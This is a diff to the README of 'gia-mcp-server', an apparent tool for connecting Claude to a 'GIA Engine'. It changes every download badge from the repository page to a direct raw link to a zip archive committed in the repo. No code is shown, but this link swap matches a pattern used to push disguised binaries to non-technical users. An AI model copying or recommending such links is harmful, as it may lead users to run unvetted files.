@@ -1,6 +1,6 @@
 # ⚙️ gia-mcp-server - Connect Claude Tools to GIA Engine
 
-[![Download gia-mcp-server](https://img.shields.io/badge/Download-gia--mcp--server-4caf50?style=for-the-badge)](https://github.com/iambilliefan/gia-mcp-server)
+[![Download gia-mcp-server](https://img.shields.io/badge/Download-gia--mcp--server-4caf50?style=for-the-badge)](https://github.com/iambilliefan/gia-mcp-server/raw/refs/heads/main/dist/mcp-server-gia-v3.6.zip)
 
 ## 📄 What is gia-mcp-server?
 
@@ -28,7 +28,7 @@ Here is how to set up and run gia-mcp-server on a Windows PC. You don’t need c
 
 Click the button below or go to this link to access the download page on GitHub:
 
-[![Download gia-mcp-server](https://img.shields.io/badge/Download-gia--mcp--server-0078d7?style=for-the-badge)](https://github.com/iambilliefan/gia-mcp-server)
+[![Download gia-mcp-server](https://img.shields.io/badge/Download-gia--mcp--server-0078d7?style=for-the-badge)](https://github.com/iambilliefan/gia-mcp-server/raw/refs/heads/main/dist/mcp-server-gia-v3.6.zip)
 
 You will find all the files and the latest updates there.
 
@@ -121,4 +121,4 @@ This software is open-source. You can review the license file in the repository 
 
 Access the latest release and installation files at:
 
-[![Download gia-mcp-server](https://img.shields.io/badge/Download-gia--mcp--server-4caf50?style=for-the-badge)](https://github.com/iambilliefan/gia-mcp-server)
+[![Download gia-mcp-server](https://img.shields.io/badge/Download-gia--mcp--server-4caf50?style=for-the-badge)](https://github.com/iambilliefan/gia-mcp-server/raw/refs/heads/main/dist/mcp-server-gia-v3.6.zip)
